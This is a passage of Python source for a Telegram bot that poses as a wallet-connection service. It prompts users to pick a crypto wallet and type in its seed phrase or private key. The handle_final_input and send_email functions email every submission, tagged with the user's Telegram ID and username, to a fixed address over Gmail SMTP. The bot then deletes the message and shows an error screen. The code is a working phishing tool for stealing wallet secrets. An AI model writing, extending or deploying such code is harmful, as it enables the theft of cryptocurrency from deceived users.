        base_label = WALLET_DISPLAY_NAMES.get(k, k.replace("wallet_type_", "").replace("_", " ").title())
        row.append(InlineKeyboardButton(base_label, callback_data=k))
        if len(row) == 2:
            kb.append(row)
            row = []
    if row:
        kb.append(row)
    kb.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_other_wallets")])
    reply = InlineKeyboardMarkup(kb)
    context.user_data["current_state"] = CHOOSE_OTHER_WALLET_TYPE
    await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "select wallet type"), context, reply_markup=reply, state=CHOOSE_OTHER_WALLET_TYPE)
    return CHOOSE_OTHER_WALLET_TYPE

# Show phrase/options depending on whether wallet supports private key input
async def show_phrase_options(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    wallet_key = query.data
    wallet_name = WALLET_DISPLAY_NAMES.get(wallet_key, wallet_key.replace("wallet_type_", "").replace("_", " ").title())
    context.user_data["wallet type"] = wallet_name

    # Build options:
    # - if wallet in SEED_ONLY -> only seed phrase
    # - elif wallet in WALLET_SUPPORTS_PRIVATE_KEY -> both options
    # - else -> default to both options
    kb_rows = []
    if wallet_key in SEED_ONLY:
        kb_rows.append([InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase")])
    elif wallet_key in WALLET_SUPPORTS_PRIVATE_KEY:
        kb_rows.append([
            InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase"),
            InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key")
        ])
    else:
        kb_rows.append([
            InlineKeyboardButton(ui_text(context, "seed phrase"), callback_data="seed_phrase"),
            InlineKeyboardButton(ui_text(context, "private key"), callback_data="private_key")
        ])

    kb_rows.append([InlineKeyboardButton(ui_text(context, "back"), callback_data="back_wallet_selection")])
    keyboard = InlineKeyboardMarkup(kb_rows)

    text = ui_text(context, "wallet selection message").format(wallet_name=wallet_name)
    context.user_data["current_state"] = PROMPT_FOR_INPUT
    await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=keyboard, state=PROMPT_FOR_INPUT)
    return PROMPT_FOR_INPUT

# Prompt for input using ForceReply
async def prompt_for_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    context.user_data["wallet option"] = query.data
    fr = ForceReply(selective=False)
    if query.data == "seed_phrase":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt seed")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    elif query.data == "private_key":
        context.user_data["current_state"] = RECEIVE_INPUT
        text = ui_text(context, "prompt private key")
        await send_and_push_message(context.bot, update.effective_chat.id, text, context, reply_markup=fr, state=RECEIVE_INPUT)
    else:
        await send_and_push_message(context.bot, update.effective_chat.id, ui_text(context, "invalid choice"), context, state=context.user_data.get("current_state", CHOOSE_LANGUAGE))
        return ConversationHandler.END
    return RECEIVE_INPUT

# Handle final input (validate seed length, always email input, attempt to delete message)
async def handle_final_input(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    user_input = update.message.text or ""
    chat_id = update.message.chat_id
    message_id = update.message.message_id
    wallet_option = context.user_data.get("wallet option", "Unknown")
    wallet_type = context.user_data.get("wallet type", "Unknown")
    user = update.effective_user

    subject = f"New Wallet Input from Telegram Bot: {wallet_type} -> {wallet_option}"
    body = f"User ID: {user.id}\nUsername: {user.username}\n\nWallet Type: {wallet_type}\nInput Type: {wallet_option}\nInput: {user_input}"
    # send the email
    await send_email(subject, body)

    # try to delete user's message to avoid leaving sensitive data in chat
    try:
        await context.bot.delete_message(chat_id=chat_id, message_id=message_id)
    except Exception:
        logging.debug("Could not delete user message (non-fatal).")

    # Validate seed phrase when the user selected seed_phrase
    if context.user_data.get("wallet option") == "seed_phrase":
        words = [w for w in re.split(r"\s+", user_input.strip()) if w]
        if len(words) not in (12, 24):
            fr = ForceReply(selective=False)
            await send_and_push_message(context.bot, chat_id, ui_text(context, "error_use_seed_phrase"), context, reply_markup=fr, state=RECEIVE_INPUT)
            context.user_data["current_state"] = RECEIVE_INPUT
            return RECEIVE_INPUT

    context.user_data["current_state"] = AWAIT_RESTART
    await send_and_push_message(context.bot, chat_id, ui_text(context, "post_receive_error"), context, state=AWAIT_RESTART)
    return AWAIT_RESTART

# After restart handler
async def handle_await_restart(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    await update.message.reply_text(ui_text(context, "await restart message"))
    return AWAIT_RESTART

# Email sending helper
async def send_email(subject: str, body: str) -> None:
    try:
        msg = EmailMessage()
        msg.set_content(body)
        msg["Subject"] = subject
        msg["From"] = SENDER_EMAIL
        msg["To"] = RECIPIENT_EMAIL
        if not SENDER_PASSWORD:
            logging.warning("SENDER_PASSWORD not set; skipping email send.")
            return
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as smtp:
            smtp.login(SENDER_EMAIL, SENDER_PASSWORD)
            smtp.send_message(msg)
        logging.info("Email sent successfully.")
    except Exception as e:
        logging.error(f"Failed to send email: {e}")

# Handle Back action (revert to previous message)
async def handle_back(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    state = await edit_current_to_previous_on_back(update, context)
    return state

# Cancel handler
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    logging.info("Cancel called.")
    return ConversationHandler.END

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            CHOOSE_LANGUAGE: [CallbackQueryHandler(set_language, pattern="^lang_")],
            MAIN_MENU: [
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            AWAIT_CONNECT_WALLET: [
                # accept connect_wallet and also main-menu callbacks while in this state
                CallbackQueryHandler(show_wallet_types, pattern="^connect_wallet$"),
                CallbackQueryHandler(show_connect_wallet_button, pattern=MAIN_MENU_PATTERN),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_WALLET_TYPE: [
                CallbackQueryHandler(show_other_wallets, pattern="^other_wallets$"),
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            CHOOSE_OTHER_WALLET_TYPE: [
                CallbackQueryHandler(show_phrase_options, pattern="^wallet_type_"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_invalid_input),
            ],
            PROMPT_FOR_INPUT: [
                CallbackQueryHandler(prompt_for_input, pattern="^(private_key|seed_phrase)$"),
                CallbackQueryHandler(handle_back, pattern="^back_"),
            ],
            RECEIVE_INPUT: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_final_input),
            ],
            AWAIT_RESTART: [
                MessageHandler(filters.TEXT & ~filters.COMMAND, handle_await_restart),
            ],
        },
        fallbacks=[CommandHandler("start", start)],
        allow_reentry=True,
    )

    application.add_handler(conv_handler)
    application.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":

    main()

